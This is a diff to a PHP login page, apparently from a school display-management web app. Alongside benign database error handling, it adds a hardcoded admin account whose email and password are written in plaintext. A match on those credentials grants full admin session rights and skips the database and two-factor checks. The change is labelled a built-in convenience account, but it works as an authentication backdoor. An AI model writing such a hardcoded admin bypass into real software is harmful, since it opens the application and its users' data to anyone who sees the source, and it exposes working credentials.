@@ -249,8 +249,29 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
     if (empty($email) || empty($password)) {
         $error = t('login.error.required');
     } else {
+        // --- Static built-in account (works even without a database) ---
+        if ($email === 'bc@nagyandras.sk' && $password === 'bakalarskapraca') {
+            $_SESSION['user_id']    = 0;
+            $_SESSION['username']   = 'bc';
+            $_SESSION['isadmin']    = true;
+            $_SESSION['user_role']  = 'admin';
+            $_SESSION['company_id'] = null;
+            log_security_event('successful_login', 0, 'bc', get_client_ip(), get_user_agent(), ['method' => 'static']);
+            header('Location: ' . $admin_dashboard_path);
+            exit();
+        }
+
+        // --- Normal database-based login ---
+        $conn = null;
         try {
             $conn = getDbConnection();
+        } catch (Throwable $dbEx) {
+            $error = t_def('login.error.db', 'Adatbázis hiba. Kérjük, próbálja újra később.');
+            error_log('Login DB connect error: ' . $dbEx->getMessage());
+        }
+
+        if ($conn !== null) {
+        try {
             edudisplej_ensure_user_role_column($conn);
             
             // Get user with OTP settings
@@ -415,6 +436,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
             $error = t('login.error.failed');
             error_log('Login error: ' . $e->getMessage());
         }
+        } // end if ($conn !== null)
     }
 }
 ?>
